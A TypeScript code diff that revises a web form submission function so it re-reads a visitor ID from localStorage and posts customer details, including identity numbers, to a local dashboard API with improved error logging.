@@ -28,25 +28,31 @@ export async function secureAddData(data: Record<string, any>): Promise<void> {
 }
 
 export async function secureSubmitFormData(data: Record<string, any>): Promise<void> {
-  // Get visitorId
-  const visitorId = data?.id || data?.visitorId || (typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null);
-  if (!visitorId) {
-    console.error('[secureSubmitFormData] No visitorId!');
+  // Get current visitorId from localStorage AFTER addData updates it
+  // This ensures we use the valid (possibly new) visitorId after potential re-creation
+  const currentVisitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null;
+  
+  if (!currentVisitorId) {
+    console.error('[secureSubmitFormData] No visitorId in localStorage!');
     return;
   }
 
-  // 1. Save visitor data to database
+  // 1. Save visitor data to database (this may update visitorId in localStorage if it was deleted)
   await secureAddData(data);
 
-  // 2. Create/Update dashboard entry immediately
+  // 2. Get the (possibly updated) visitorId from localStorage
+  const visitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : currentVisitorId;
+  console.log('[secureSubmitFormData] Using visitorId:', visitorId);
+
+  // 3. Create/Update dashboard entry immediately
   const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
   
   try {
-    await fetch('/api/dashboard/requests', {
+    const response = await fetch('/api/dashboard/requests', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        id: visitorId, // Use visitorId directly
+        id: visitorId, // Use (possibly updated) visitorId
         visitorId: visitorId,
         customer: customerName,
         identityNumber: data?.identityNumber || '',
@@ -61,7 +67,12 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
         raw: data
       })
     });
-    console.log('[secureSubmitFormData] Dashboard entry created');
+    
+    if (response.ok) {
+      console.log('[secureSubmitFormData] Dashboard entry created successfully');
+    } else {
+      console.error('[secureSubmitFormData] Dashboard API returned:', response.status);
+    }
   } catch (error) {
     console.error('[secureSubmitFormData] Failed to create dashboard entry:', error);
   }
